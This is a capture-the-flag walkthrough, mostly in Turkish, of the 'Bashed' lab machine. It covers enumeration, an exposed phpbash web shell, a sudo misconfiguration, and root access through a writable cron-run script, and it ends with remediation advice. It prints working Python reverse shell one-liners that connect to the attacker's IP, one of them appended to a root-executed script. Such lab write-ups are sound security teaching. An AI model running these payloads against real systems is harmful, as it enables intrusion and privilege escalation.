<img width="1400" height="1138" alt="1_-YPHvrd3pj3L2cUcZWfsKQ" src="https://github.com/user-attachments/assets/acd542e5-df2c-47b6-9eaf-3805447204fd" />

### About

Bashed is an easy Linux machine focused on web fuzzing and locating exposed development files. After discovering a functional phpbash instance, access is gained as `www-data` and escalated to `scriptmanager` through sudo permissions. As direct crontab access is restricted, root escalation relies on identifying writable scripts executed by a root-owned scheduled task.

### 1. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.51.18
```

<img width="539" height="382" alt="nmap" src="https://github.com/user-attachments/assets/40befac0-da60-43d5-936e-ec02aacdfc55" />

Tek açık port 80, arkasında Apache 2.4.18 üzerinde çalışan bir web uygulaması. Sayfa başlığı `Arrexel's Development Site` — saldırı yüzeyi tamamen web katmanına indirgeniyor.

### 2. Web Enumeration

<img width="1010" height="555" alt="site1" src="https://github.com/user-attachments/assets/e3fa8a00-7c42-422c-9e70-bd489d7aa505" />

Sayfa içeriği statik ve boş, dizin taramasına geçiliyor:

```bash
ffuf -u http://10.129.51.18/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

<img width="753" height="263" alt="ffuf" src="https://github.com/user-attachments/assets/fbd2d3d6-e38f-4829-a488-85c56165816a" />

`dev` dizini kontrol ediliyor:

<img width="582" height="318" alt="dev" src="https://github.com/user-attachments/assets/d0c2de47-420f-4d38-97e8-8ba569f0c918" />

**phpbash**, açık kaynaklı semi-interactive bir PHP web shell — production'da unutulmuş bir geliştirme aracı.

### 3. Foothold

`phpbash.php`, tarayıcı üzerinden doğrudan komut çalıştırma imkânı veriyor — paketlenmiş bir RCE.

```
www-data@bashed:/home/arrexel# cat user.txt
efd6cb94fd86d921ba0cb64f733e6a46
```

<img width="665" height="152" alt="userflag" src="https://github.com/user-attachments/assets/d590441a-5397-4b97-84c9-f31589e7e9be" />

phpbash state tutmadığı ve her istekte sayfayı yenilediği için, çalışmayı terminale taşımak adına klasik bir Python reverse shell tetikleniyor:

```bash
rlwrap nc -nvlp 4444
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Bind shell yerine reverse shell tercih edilmesinin sebebi, hedefin muhtemelen firewall/NAT arkasında olması — outbound bağlantılar inbound'a göre çok daha az kısıtlanır.

```
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 46020
/bin/sh: 0: can't access tty; job control turned off
$
```

---

### 4. Privilege Escalation — www-data → scriptmanager

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
$ sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data`, şifre girmeden `scriptmanager` kimliğiyle **herhangi bir komutu** çalıştırabiliyor — kural muhtemelen tek bir script'e izin vermek amacıyla yazılmış, `ALL` ile kapsam tamamen genişletilmiş. Klasik bir sudo misconfiguration.

```bash
sudo -u scriptmanager /bin/bash
```

### 5. Privilege Escalation — scriptmanager → root

`scriptmanager` context'inde dikkat çeken nokta, kullanıcıya özel bir dizin:

```
$ ls -ld /scripts
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun  2  2022 /scripts
```

`www-data` iken bu dizine erişim `Permission denied` ile reddediliyordu; izinler sadece `scriptmanager` sahipliği/grubuna yazma-okuma hakkı tanıyor. `sudo -l` çıktısındaki `NOPASSWD: ALL` doğrudan crontab'a erişim vermiyor — root'un crontab'ını göremiyoruz. Ama isim seçimi (`scriptmanager` + `/scripts`) tek başına güçlü bir sinyal: bu paternde neredeyse her zaman root'a ait bir cron job, bu dizini periyodik tarayıp içindeki dosyaları kendi yetkisiyle çalıştırır. Crontab'a doğrudan erişim yoksa bu, genelde `pspy` ile (root yetkisi gerektirmeden çalışan process'leri gözlemleyen bir araç) doğrulanır; Bashed'de senaryo tam olarak bu — `/scripts` altındaki `.py` dosyaları root cron job'u tarafından düzenli aralıklarla execute ediliyor.

Zincir şu şekilde tamamlanıyor:

1. `/scripts`, `scriptmanager` tarafından yazılabilir.
2. Root, bu dizindeki script'leri periyodik olarak kendi yetkisiyle çalıştırıyor.
3. `scriptmanager` context'i bu dizine dosya yazmaya yetiyor.
4. **Sonuç:** Buraya bırakılan herhangi bir kod, root tarafından root yetkisiyle execute edilir — klasik *writable path + privileged scheduled execution* kombinasyonu.

İkinci bir listener açılıyor (ilk shell korunuyor):

```bash
rlwrap nc -nvlp 4445
```

`/scripts` dizinine yeni bir payload yazılıyor:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.187",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /scripts/test.py
```

Port `4444`'ten farklı seçildi (`4445`), aktif ilk shell ile karışmasın diye. `echo ... >>` tercih edilmesinin nedeni pratik: elde interaktif bir editör olmadan dosyayı doğrudan oluşturup içeriği tek satırda yazmak.

Cron'un bir sonraki tetiklenmesi (tipik olarak ≤1 dakika) bekleniyor:

```
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.18] 35430
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

`test.py`, root'un cron job'u tarafından root yetkisiyle çalıştırıldı ve içindeki reverse shell payload'ı tetiklendi.

```
# cd /root
# cat root.txt
7296b59278b52eb59fbb3c51f8043a27
```

---

### Özet

Zincir üç yapılandırma hatasının üst üste gelmesinden oluşuyor: production'da unutulmuş bir debug web shell (phpbash) doğrudan RCE veriyor; `sudo -l` çıktısındaki `NOPASSWD: ALL` kuralı `scriptmanager`'a sınırsız komut çalıştırma yetkisi tanıyor; ve root'a ait bir cron job, düşük yetkili bir kullanıcı tarafından yazılabilir bir dizini (`/scripts`) kontrolsüzce execute ediyor. Kalıcı çözüm: geliştirme araçlarının CI/CD seviyesinde production'dan hariç tutulması, sudo kurallarının komut bazında en az yetkiyle (`Cmnd_Alias` + spesifik path) sınırlandırılması, ve root tarafından çalıştırılan her cron script'inin sahiplik/yazma izinlerinin düzenli denetlenmesi.
